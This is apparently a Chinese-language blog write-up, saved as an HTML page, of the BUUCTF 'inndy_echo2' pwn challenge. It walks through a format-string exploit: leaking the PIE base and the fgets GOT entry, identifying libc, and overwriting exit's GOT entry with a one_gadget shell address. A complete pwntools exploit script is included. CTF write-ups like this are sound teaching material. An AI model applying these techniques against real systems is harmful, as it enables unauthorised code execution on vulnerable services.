@@ -1,0 +1,63 @@
+<!doctype html><html><head lang=en><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>BUU-inndy_echo2-WP - blog of chuj</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="这是一道非常好的题目，我做完之后很有收获。 从安全措施上来看，本题开启了PIE，没开canary（虽然实际上开与不开是不影响这道题的） 这道题和"><meta property="og:image" content><meta property="og:title" content="BUU-inndy_echo2-WP"><meta property="og:description" content="这是一道非常好的题目，我做完之后很有收获。 从安全措施上来看，本题开启了PIE，没开canary（虽然实际上开与不开是不影响这道题的） 这道题和"><meta property="og:type" content="article"><meta property="og:url" content="https://chujdk.github.io/wp/buu-inndy_echo2-wp.html"><meta property="article:section" content="posts"><meta property="article:published_time" content="2020-11-25T14:40:53+00:00"><meta property="article:modified_time" content="2020-11-25T14:40:53+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="BUU-inndy_echo2-WP"><meta name=twitter:description content="这是一道非常好的题目，我做完之后很有收获。 从安全措施上来看，本题开启了PIE，没开canary（虽然实际上开与不开是不影响这道题的） 这道题和"><script src=https://chujdk.github.io/js/feather.min.js></script>
+<link href=https://chujdk.github.io/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://chujdk.github.io/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js></script>
+<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script>
+<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><link rel=stylesheet type=text/css href=https://chujdk.github.io/css/font.e98a2c89163f90d6fa6d8baf5a50a6561f8ff3d0be1551265f364d138d75df33.css></head><body><div class=content><header><div class=main><a href=https://chujdk.github.io/>blog of chuj</a></div><nav><a href=/>Home</a>
+<a href=/posts.html>All posts</a>
+<a href=/about.html>About</a>
+<a href=/tags.html>Tags</a></nav></header><main><article><div class=title><h1 class=title>BUU-inndy_echo2-WP</h1><div class=meta>Posted on Nov 25, 2020</div></div><section class=body><p>这是一道非常好的题目，我做完之后很有收获。</p><div class=wp-block-image><figure class="aligncenter size-large"><img src=https://www.cjovi.icu/usr/uploads/2020/11/QQ截图20201125131844.png alt class=wp-image-613></figure></div><p>从安全措施上来看，本题开启了PIE，没开canary（虽然实际上开与不开是不影响这道题的）</p><div class=wp-block-image><figure class="aligncenter size-large"><img src=https://www.cjovi.icu/usr/uploads/2020/11/QQ截图20201125132013.png alt class=wp-image-614></figure></div><p>这道题和<a href=http://www.cjovi.icu/2020/11/24/buu-inndy_echo-wp/>echo</a>看起来很像，但是实际上有不少区别，不仅仅是64位和32位的区别。首先，printf输出的字符上限受到了限制，一次最多输出256个字节，也就是说我们一次只能覆盖两个字节，因此我们无法像echo一样一次覆盖printf的got表为system的plt，由于我们要使用printf来覆盖，部分覆盖会使printf无法使用，所以覆盖printf的got不可行(但是又确实有师傅做到了覆盖printf，不太理解原理)。</p><p>所以我们要考虑更换覆盖的函数，而exit函数就非常的合适（system其实也可以，在循环后面就可以了）。但是这些个函数都无法人为指定参数，所以我们需要它直接返回到execve("/bin/sh", ...)这样的函数。程序本身是没有的，但是我们可以多次泄露任意地址内存，由此可以dump出libc，所以我们可以考虑通过LibcSearcher来找出libc，再通过one_gadget来找到目标函数。</p><p>思路分析到这里，我们来谈具体做法，首先由于程序开启了PIE保护，需要先泄露程序地址，在执行echo函数时，echo的栈帧的上一个元素存储了函数的返回地址，返回到main中，所以栈中必定有返回地址。我们先尝试输入一串泄露payload</p><figure class="wp-block-image size-large"><img src=https://www.cjovi.icu/usr/uploads/2020/11/QQ截图20201125133519.png alt class=wp-image-615></figure><p>这里可以看出从栈顶开始的第六个是字符串的起始地址，</p><div class=wp-block-image><figure class="aligncenter size-large"><img src=https://www.cjovi.icu/usr/uploads/2020/11/QQ截图20201125133641.png alt class=wp-image-616></figure></div><p>ida中又可以看出字符串到栈底的偏移是0x110，所以如果我们想输出return address，那么就应该是第(0x110+0x8)/8 + 6=41个参数。因此</p><pre class=wp-block-code><code>sh.sendline("%41$p")                                            
+baseAddr = int(sh.recvuntil('\n',drop = True),base = 16) - 0xa03
+print hex(baseAddr)                                             </code></pre><p>这样我们就可以获得基地址了。被减掉的0xa03是固定的低12位。</p><p>有了基地址我们考虑泄露某个函数的got表，这里我选择了fgets</p><pre class=wp-block-code><code>fgets_got_addr = baseAddr + elf.got&#91;"fgets"]                             
+exit_got = baseAddr + elf.got&#91;"exit"]                                    
+                                                                         
+sh.sendline("stop%8$sdoneaaaa" + p64(fgets_got_addr))                    
+sh.recvuntil("stop")                                                     
+fgets_addr = u64(sh.recvuntil("doneaaaa",drop=True)&#91;0:8].ljust(8,'\x00'))
+print hex(fgets_addr)                                                    </code></pre><p>这样我们泄露了fgets的got表值，然后通过LibcSearcher来查找对应的libc版本</p><pre class=wp-block-code><code>libc = LibcSearcher('fgets', fgets_addr)</code></pre><p>我们来看一下执行结果（虽然各位师傅应该非常的清楚，但是我还是多说一句，这个时候要连服务器而不是本地，泄露自己的libc是没用的！）</p><div class=wp-block-image><figure class="aligncenter size-large"><img src=https://www.cjovi.icu/usr/uploads/2020/11/QQ截图20201125134225.png alt class=wp-image-619></figure></div><p>欸，非常好，只有一个匹配结果，那就是他了，然后我们用one_gadget来查找可用的函数</p><div class=wp-block-image><figure class="aligncenter size-large"><img src=https://www.cjovi.icu/usr/uploads/2020/11/QQ截图20201125134524.png alt class=wp-image-621></figure></div><p>这几个都可以用。为了调用它，我们需要其实际的虚拟地址，就是说需要一个libc的基址，正好我们之前泄露了fgets的地址，手上又有一个找到的libc，我们直接到这个libc里面找fgets，放到IDA里面，alt+t查找，输入fgets</p><div class=wp-block-image><figure class="aligncenter size-large"><img src=https://www.cjovi.icu/usr/uploads/2020/11/QQ截图20201125134807.png alt class=wp-image-622></figure></div><p>搞定，那么我们只要用fgets减掉6DAD0在加上one_gadget中取得的地址就得到可用的地址了。</p><p>地址都搞到了就只差覆写了，这里要注意64位机上地址中很容易出现\x00，所以我们把地址放到payload的最后，这样printf的时候就不会输出不了字符了。然后我们分多次覆写就可以了。</p><pre class=wp-block-code><code>execve_addr = fgets_addr - 0x6DAD0 + 0xf02a4                                      
+print hex(execve_addr)                                                            
+                                                                                  
+for i in range(0,8):                                                              
+    #overwrite execve_addr+i                                                      
+    length = execve_addr % 0x100                                                  
+    payload = ('%' + str(length) + 'c' + "%8$hhn").ljust(16,'a') + p64(exit_got+i)
+    if length == 0:                                                               
+        payload = ("%8$hhn").ljust(16,'a') + p64(exit_got+i)                      
+    sh.sendline(payload)                                                          
+    sh.recvuntil(chr(int(str(hex(exit_got))&#91;2:4],base = 16)))                     
+    execve_addr >>= 8                                                             </code></pre><p>就是这么处理的。</p><p>最后的exp</p><pre class=wp-block-code><code>from pwn import *                                                                 
+from LibcSearcher import *                                                        
+                                                                                  
+context(log_level = "debug")                                                      
+#sh = process("./echo2")                                                          
+sh = remote("node3.buuoj.cn",29229)                                               
+elf = ELF("./echo2")                                                              
+                                                                                  
+sh.sendline("%41$p")                                                              
+baseAddr = int(sh.recvuntil('\n',drop = True),base = 16) - 0xa03                  
+print hex(baseAddr)                                                               
+                                                                                  
+system_plt_addr = baseAddr + elf.symbols&#91;"system"]                                
+fgets_got_addr = baseAddr + elf.got&#91;"fgets"]                                      
+exit_got = baseAddr + elf.got&#91;"exit"]                                             
+                                                                                  
+sh.sendline("stop%8$sdoneaaaa" + p64(fgets_got_addr))                             
+sh.recvuntil("stop")                                                              
+fgets_addr = u64(sh.recvuntil("doneaaaa",drop=True)&#91;0:8].ljust(8,'\x00'))         
+print hex(fgets_addr)                                                             
+                                                                                  
+execve_addr = fgets_addr - 0x6DAD0 + 0xf02a4                                      
+print hex(execve_addr)                                                            
+                                                                                  
+for i in range(0,8):                                                              
+    #overwrite execve_addr+i                                                      
+    length = execve_addr % 0x100                                                  
+    payload = ('%' + str(length) + 'c' + "%8$hhn").ljust(16,'a') + p64(exit_got+i)
+    if length == 0:                                                               
+        payload = ("%8$hhn").ljust(16,'a') + p64(exit_got+i)                      
+    sh.sendline(payload)                                                          
+    sh.recvuntil(chr(int(str(hex(exit_got))&#91;2:4],base = 16)))                     
+    execve_addr >>= 8                                                             
+                                                                                  
+sh.sendline("exit")                                                               
+                                                                                  
+sh.interactive()                                                                  </code></pre></section><div class=post-tags></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/chujDK rel=me title=GitHub><i data-feather=github></i></a>
+<a class=border></a></div><div class=footer-info>2023 <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>
